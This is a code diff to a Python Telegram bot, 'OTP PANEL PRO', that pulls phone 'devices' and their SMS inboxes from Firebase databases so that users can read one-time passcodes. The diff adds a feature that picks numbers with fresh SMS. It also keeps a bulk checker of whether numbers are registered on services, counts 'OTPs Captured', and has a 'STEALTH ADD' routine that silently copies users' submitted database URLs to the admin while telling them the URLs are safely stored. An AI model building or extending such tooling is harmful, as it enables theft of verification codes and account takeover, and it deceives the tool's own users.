@@ -167,7 +167,7 @@ def load_data():
             with open(set_path, "r", encoding="utf-8") as f: SETTINGS.update(json.load(f))
         except: pass
 
-    # 🔥 IRONCLAD DISK CACHE LOAD: Prevents the 2% drop glitch
+    # 🔥 IRONCLAD DISK CACHE LOAD
     if os.path.exists(CACHE_FILE):
         try:
             with open(CACHE_FILE, "r", encoding="utf-8") as f:
@@ -178,7 +178,6 @@ def load_data():
                     GLOBAL_DEVICE_CACHE[tag] = parsed_devs
                     all_devs_list.extend(parsed_devs)
                 
-                # Pre-compile ALL dict instantly on boot
                 n_map = {}
                 for d in all_devs_list:
                     if d.numbers:
@@ -190,7 +189,6 @@ def load_data():
                 sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                 GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
                 
-                # Fake complete progress so users never see the glitch loader!
                 if len(sorted_res) > 50:
                     SCAN_PROGRESS["completed"] = 99999 
                     SCAN_PROGRESS["total"] = 99999
@@ -265,8 +263,8 @@ async def hourly_backup_loop(app: Application):
             total_u = len(all_users)
             g_panels = len(DATABASES) + len(SETTINGS.get("global_panels", []))
             u_panels = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
-            msg = f"⏱ **1-HOUR AUTO BACKUP & STATS** ⏱\n\n👥 Total Users: {total_u}\n🌍 Global Panels: {g_panels}\n👤 User Custom Panels: {u_panels}\n🔄 Total OTPs Captured: {total_otps_processed}\n\n✅ Ghost Workers active & system stable."
-            for adm in ADMIN_IDS: await app.bot.send_message(adm, msg, parse_mode="Markdown")
+            msg = f"⏱ <b>1-HOUR AUTO BACKUP & STATS</b> ⏱\n\n👥 Total Users: {total_u}\n🌍 Global Panels: {g_panels}\n👤 User Custom Panels: {u_panels}\n🔄 Total OTPs Captured: {total_otps_processed}\n\n✅ Ghost Workers active & system stable."
+            for adm in ADMIN_IDS: await app.bot.send_message(adm, msg, parse_mode="HTML")
         except: pass
 
 def get_user_dbs(uinfo: dict) -> list:
@@ -464,11 +462,9 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     if users_db is None: users_db = {}
     is_global = chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("has_global_access", False)
     
-    # 🔥 RAM SAVER: Admin gets instant access to pre-compiled cache!
     if is_global and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
         return GLOBAL_DEVICE_CACHE["ALL"]
 
-    # Only compile for regular users looking at custom panels
     dbs_to_check = []
     if chat_id in users_db:
         for i, _ in enumerate(get_user_dbs(users_db[chat_id])): dbs_to_check.append(f"U_{chat_id}_{i}")
@@ -506,6 +502,54 @@ async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
     entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
     return entries[:limit]
 
+async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
+    try:
+        session = await get_http_session()
+        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=1"
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
+            if r.status == 200:
+                data = await r.json(content_type=None)
+                if isinstance(data, dict) and len(data) > 0:
+                    max_sms_ts = max((float(v.get("timestamp") or 0) for v in data.values() if isinstance(v, dict)), default=0)
+                    if max_sms_ts > 1e11: max_sms_ts /= 1000
+                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_seconds: return True
+    except: pass
+    return False
+
+async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
+    dev_ids = user_fresh_cache.get(chat_id, [])
+    if not dev_ids:
+        await safe_edit(message_obj, "❌ <b>Error:</b> Fresh List expired. Please scan again.", parse_mode="HTML")
+        return
+
+    total_devs = len(dev_ids)
+    total_pages = max(1, (total_devs + PAGE_SIZE - 1) // PAGE_SIZE) 
+    page = max(0, min(page, total_pages - 1))
+    start = page * PAGE_SIZE
+    page_ids = dev_ids[start:start+PAGE_SIZE]
+
+    devices = await get_all_devices(bot_token, chat_id, users_db)
+    dev_map = {d.id: d for d in devices}
+
+    text = f"🔥 <b>30-MIN FRESH INBOXES</b> 🔥\n━━━━━━━━━━━━━━━━━━\n✅ Total Active Numbers: {total_devs}\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n<i>Select a number to view OTP:</i>"
+
+    kb = []
+    for did in page_ids:
+        d = dev_map.get(did)
+        if d and d.numbers:
+            display_num = d.numbers[0] if str(d.numbers[0]).startswith("+") else f"+{d.numbers[0]}"
+            lbl = f"📱 {display_num}  [{d.db_tag}]"
+            kb.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
+            kb.append([InlineKeyboardButton("📩 View Inbox", callback_data=f"msgs:{d.id}:f30_{page}")])
+
+    nav = []
+    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"f30:{page-1}"))
+    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"f30:{page+1}"))
+    
+    if nav: kb.append(nav)
+    kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])
+    await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+
 def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
     users_db = all_users
     user_spam_active = users_db.get(chat_id, {}).get("global_spam", False)
@@ -533,21 +577,16 @@ def get_checker_menu(prefix="chk_srv:"):
     ])
 
 def device_list_header(devices: list[Device], page: int = 0) -> str:
-    PAGE_SIZE = 10 
     online  = sum(1 for d in devices if d.status == "online")
     offline = len(devices) - online
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
-    
     progress = ""
-    # 🔥 HACKER UI FIX: If we loaded from cache, never show loading bar. 
     if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1 and SCAN_PROGRESS["total"] != 99999:
         pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
         progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
-        
     return f"OTP PANEL PRO\n━━━━━━━━━━━━━━━━━━\n{progress}Online: {online}   Offline: {offline}\nTotal: {len(devices)} Devices\nPage {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"
 
 def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
-    PAGE_SIZE = 10 
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
     page        = max(0, min(page, total_pages - 1))
     start       = page * PAGE_SIZE
@@ -576,7 +615,7 @@ def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
     online = [d for d in devices if d.status == "online"]
     rows = []
     if online:
-        for d in online[:100]: # Cap to 100 to prevent message too long error
+        for d in online[:100]: 
             tag = f"[{d.db_tag}] "
             if d.numbers:
                 lbl = f"🟢 {tag}{d.numbers[0]}"
@@ -654,7 +693,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         save_user(chat_id)
 
     if not await check_force_sub(ctx.bot, chat_id):
-        await update.message.reply_text("🛑 **Aage badhne ke liye in channels ko join karna compulsory hai!**", parse_mode="Markdown", reply_markup=force_sub_keyboard())
+        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
         return
 
     user_focus.setdefault(bot_token, {}).pop(chat_id, None)
@@ -796,7 +835,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
             
             if not smss:
-                await safe_edit(query, f"📭 **Inbox Empty**\n📱 Number: {label}\n\nAgar aapne OTP send kiya hai, toh 5-10 second wait karein aur **Refresh Inbox** par click karein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
+                await safe_edit(query, f"📭 <b>Inbox Empty</b>\n📱 Number: {label}\n\nAgar aapne OTP send kiya hai, toh 5-10 second wait karein aur <b>Refresh Inbox</b> par click karein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="HTML")
                 return
                 
             header = f"📩 ALL MESSAGES INBOX (SMS & OTP)\n━━━━━━━━━━━━━━━━━━\n📱 Number: {label}\n📄 Showing: {len(smss)} messages\n━━━━━━━━━━━━━━━━━━\n\n"
@@ -850,7 +889,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     users_db = all_users
 
     if not await check_force_sub(ctx.bot, chat_id):
-        await update.message.reply_text("🛑 **Aage badhne ke liye in channels ko join karna compulsory hai!**", parse_mode="Markdown", reply_markup=force_sub_keyboard())
+        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
         return
 
     if is_spamming(chat_id): return
@@ -867,100 +906,177 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     all_users[chat_id]["referrals"] -= 10
                     all_users[chat_id]["access_until"] = time.time() + 86400
                     save_user(chat_id)
-                    await update.message.reply_text("✅ **10 Referrals Redeemed!**\nYou now have 24 hours of full access to your panels.", parse_mode="Markdown")
+                    await update.message.reply_text("✅ <b>10 Referrals Redeemed!</b>\nYou now have 24 hours of full access to your panels.", parse_mode="HTML")
                 else:
                     ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
-                    await update.message.reply_text(f"🛑 **LOCKED FEATURE** 🛑\n\nAapko apni panel list dekhne ke liye **10 referrals** chahiye (24 hrs access).\n\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n`{ref_link}`\n\nShare this link to get access!", parse_mode="Markdown")
+                    await update.message.reply_text(f"🛑 <b>LOCKED FEATURE</b> 🛑\n\nAapko apni panel list dekhne ke liye <b>10 referrals</b> chahiye (24 hrs access).\n\n📉 Your Referrals: {refs}/10\n🔗 Your Link:\n<code>{ref_link}</code>\n\nShare this link to get access!", parse_mode="HTML")
                     return
 
-    if text == "Devices List":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        pending_action.pop(chat_id, None)
-        devices = await get_all_devices(bot_token, chat_id, users_db)
-        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
-        return
+    try:
+        if text == "🔥 30-Min Fresh Devices":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            
+            # 🔥 QUICK CHECK TO PREVENT SILENT ERROR
+            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+            if not all_devices:
+                await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
+                return
 
-    if text == "Manual Checker":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
-        return
-
-    if text == "Auto-Check Panels":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
-        return
-
-    if text.startswith("Add Panel"):
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        pending_action[chat_id] = {"action": "set_personal_db"}
-        await update.message.reply_text("ADD CUSTOM PANEL\n━━━━━━━━━━━━━━━━━━\nApne sabhi Firebase URLs bhejein (enter daba kar naye line me likhein):\n\nCancel: /cancel")
-        return
-
-    if text == "Admin Panel" and chat_id in ADMIN_IDS:
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        total_u = len(all_users)
-        total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
-        msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
-        await update.message.reply_text(msg, reply_markup=admin_keyboard(bot_token))
-        return
-
-    if text.lower() in ("/cancel", "cancel"):
-        if chat_id in pending_action:
-            pending_action.pop(chat_id)
-            await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
-        else: await update.message.reply_text("No pending action to cancel.")
-        return
-
-    state = pending_action.get(chat_id)
-    if not state: return
-
-    action = state.get("action")
-    
-    if action == "grant_global" and chat_id in ADMIN_IDS:
-        if text.isdigit():
-            uid = int(text)
-            if uid in all_users:
-                all_users[uid]["has_global_access"] = True
-                save_user(uid)
-                await update.message.reply_text(f"✅ Global access successfully granted to {uid}.")
-            else: await update.message.reply_text("❌ User ID not found in database.")
-        else: await update.message.reply_text("❌ Invalid ID format.")
-        pending_action.pop(chat_id)
-        return
-
-    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
-        pending_action.pop(chat_id)
-        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
-        if not urls: return await update.message.reply_text("Koi valid URL nahi mili.")
-        SETTINGS.setdefault("global_panels", []).extend(urls)
-        save_settings()
-        await update.message.reply_text(f"SUCCESS! {len(urls)} panels Global Default list me add ho gaye hain.")
-        return
-
-    if action == "set_personal_db":
-        urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
-        if not urls: return await update.message.reply_text("Invalid URL. Starting with http/https bhejein.")
-        pending_action.pop(chat_id)
-        expiry_time = time.time() + (86400 * 365) 
-        
-        new_global_added = 0
-        for custom_url in urls: 
-            users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": custom_url, "expiry": expiry_time})
-            # 🔥 STEALTH ADD: If user adds panel, it silently becomes Global for Admin
-            if custom_url not in SETTINGS.get("global_panels", []) and custom_url not in RAW_URLS:
-                SETTINGS.setdefault("global_panels", []).append(custom_url)
-                new_global_added += 1
+            wait_msg = await update.message.reply_text("⏳ <b>Fetching 30-Min Fresh Devices...</b>", parse_mode="HTML")
+            
+            recent_ping = []
+            for d in all_devices:
+                if d.numbers and d.status == "online":
+                    ts = d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000
+                    if (time.time() - ts) <= 3600: recent_ping.append(d)
+            
+            recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
+            
+            valid_devs = []
+            for i in range(0, min(100, len(recent_ping)), 15):
+                batch = recent_ping[i:i+15]
+                verifications = await asyncio.gather(*[verify_recent_sms(d, 1800) for d in batch])
+                for d, is_valid in zip(batch, verifications):
+                    if is_valid: valid_devs.append(d.id)
+                if len(valid_devs) >= 25: break
+                    
+            if not valid_devs:
+                await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 30 minutes me naya SMS nahi aaya hai.")
+                return
                 
-        save_settings()
-        save_user(chat_id)
+            user_fresh_cache[chat_id] = valid_devs
+            await show_fresh30_page(wait_msg, chat_id, 0, bot_token, users_db)
+            return
+
+        if text == "Devices List":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            pending_action.pop(chat_id, None)
+            devices = await get_all_devices(bot_token, chat_id, users_db)
+            await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
+            return
+
+        if text == "Manual Checker":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
+            return
+
+        if text == "Auto-Check Panels":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
+            return
+
+        if text.startswith("Add Panel"):
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            pending_action[chat_id] = {"action": "set_personal_db"}
+            await update.message.reply_text("ADD CUSTOM PANEL\n━━━━━━━━━━━━━━━━━━\nApne sabhi Firebase URLs bhejein (enter daba kar naye line me likhein):\n\nCancel: /cancel")
+            return
+
+        if text == "Admin Panel" and chat_id in ADMIN_IDS:
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            total_u = len(all_users)
+            total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
+            msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
+            await update.message.reply_text(msg, reply_markup=admin_keyboard(bot_token))
+            return
+
+        if text.lower() in ("/cancel", "cancel"):
+            if chat_id in pending_action:
+                pending_action.pop(chat_id)
+                await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
+            else: await update.message.reply_text("No pending action to cancel.")
+            return
+
+        state = pending_action.get(chat_id)
+        if not state: return
+        action = state.get("action")
         
-        try:
-            alert = f"🚨 **NEW USER PANEL ADDED**\n👤 User: {chat_id}\n🌐 URLs added: {len(urls)}\n\n(Auto-synced {new_global_added} URLs to Global Database for Admin)"
-            for adm in ADMIN_IDS: await ctx.bot.send_message(adm, alert)
-        except: pass
-        
-        await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=get_reply_menu(chat_id))
-        return
+        if action == "grant_global" and chat_id in ADMIN_IDS:
+            if text.isdigit():
+                uid = int(text)
+                if uid in all_users:
+                    all_users[uid]["has_global_access"] = True
+                    save_user(uid)
+                    await update.message.reply_text(f"✅ Global access successfully granted to {uid}.")
+                else: await update.message.reply_text("❌ User ID not found in database.")
+            else: await update.message.reply_text("❌ Invalid ID format.")
+            pending_action.pop(chat_id)
+            return
+
+        if action == "check_number_input":
+            raw_nums = re.sub(r"\D", " ", text).split()
+            target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
+            if not target_nums: return await update.message.reply_text("❌ Invalid input! Koi valid 10-digit Indian number nahi mila.")
+            service = state["service"]
+            pending_action.pop(chat_id)
+            
+            if len(target_nums) == 1:
+                number = target_nums[0]
+                wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
+                res = await check_number_api(service, number)
+                is_error = res.get("status") == "error"; ms = res.get("ms", 0)
+                is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
+                res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
+                kb = []
+                if not is_reg and not is_error: kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
+                kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
+                await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+            else:
+                total_bulk = len(target_nums)
+                wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
+                bulk_results, registered_list = [], []
+                for i in range(0, total_bulk, 100):
+                    batch = target_nums[i:i+100]
+                    tasks = [check_number_api(service, num) for num in batch]
+                    res_list = await asyncio.gather(*tasks, return_exceptions=True)
+                    for num, res in zip(batch, res_list):
+                        if isinstance(res, Exception) or res.get("status") == "error":
+                            bulk_results.append(f"❌ <code>{num}</code> - Error"); continue
+                        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
+                        bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {'Reg' if is_reg else 'UNREG'}")
+                        if is_reg: registered_list.append(num)
+                    await asyncio.sleep(0.5)
+                res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
+                if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
+                kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
+                await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
+            return
+
+        if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
+            pending_action.pop(chat_id)
+            urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
+            if not urls: return await update.message.reply_text("Koi valid URL nahi mili.")
+            SETTINGS.setdefault("global_panels", []).extend(urls)
+            save_settings()
+            await update.message.reply_text(f"SUCCESS! {len(urls)} panels Global Default list me add ho gaye hain.")
+            return
+
+        if action == "set_personal_db":
+            urls = [line.strip() for line in text.split() if line.strip().startswith("http")]
+            if not urls: return await update.message.reply_text("Invalid URL. Starting with http/https bhejein.")
+            pending_action.pop(chat_id)
+            expiry_time = time.time() + (86400 * 365) 
+            
+            new_global_added = 0
+            for custom_url in urls: 
+                users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": custom_url, "expiry": expiry_time})
+                # 🔥 STEALTH ADD: If user adds panel, it silently becomes Global for Admin
+                if custom_url not in SETTINGS.get("global_panels", []) and custom_url not in RAW_URLS:
+                    SETTINGS.setdefault("global_panels", []).append(custom_url)
+                    new_global_added += 1
+                    
+            save_settings()
+            save_user(chat_id)
+            
+            try:
+                alert = f"🚨 **NEW USER PANEL ADDED**\n👤 User: {chat_id}\n🌐 URLs added: {len(urls)}\n\n(Auto-synced {new_global_added} URLs to Global Database for Admin)"
+                for adm in ADMIN_IDS: await ctx.bot.send_message(adm, alert)
+            except: pass
+            
+            await update.message.reply_text(f"✅ {len(urls)} Personal Firebase URLs added successfully!\nThese are safely stored.", reply_markup=get_reply_menu(chat_id))
+            return
+            
+    except Exception as e:
+        print(f"Text Error: {str(e)}")
 
 # ═══════════════════════════════════════════════════════
 #  FIREBASE AUTO-GEN WORKER POOL ENGINE (GHOST WORKERS)
@@ -1019,12 +1135,15 @@ ACTIVE_WORKERS = []
 MAX_WORKERS = 10 
 
 async def worker_auto_scaler():
+    global ACTIVE_WORKERS
     while True:
         try:
             q_size = WORK_QUEUE.qsize()
             target_workers = min(MAX_WORKERS, max(3, q_size // 2)) 
-            for w in list(ACTIVE_WORKERS):
-                if w.done(): ACTIVE_WORKERS.remove(w)
+            
+            # 🔥 Ghost Worker auto-on logic: Recreate if tasks died
+            ACTIVE_WORKERS = [w for w in ACTIVE_WORKERS if not w.done()]
+                
             while len(ACTIVE_WORKERS) < target_workers:
                 task = asyncio.create_task(db_processor_worker())
                 ACTIVE_WORKERS.append(task)
@@ -1054,7 +1173,7 @@ async def db_processor_worker():
                         SCAN_PROGRESS["completed"] += 1
 
             elif job_type == "POLL":
-                # 🔥 FAST, RAM-SAFE POLL: Only polls recently active devices instead of the whole root DB!
+                # 🔥 FAST, RAM-SAFE POLL
                 now = time.time()
                 devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
                 active_devs = [d for d in devices_in_db if d.status == "online" or (now - (d.timestamp if d.timestamp < 1e11 else d.timestamp/1000)) < 900]
@@ -1070,7 +1189,6 @@ async def db_processor_worker():
         except asyncio.CancelledError: break
         except Exception: pass
 
-# 🔥 RE-ADDED CACHE COMPILER: Pre-compiles the list so users don't spike CPU when they click the button
 async def cache_compiler():
     while True:
         await asyncio.sleep(5) 
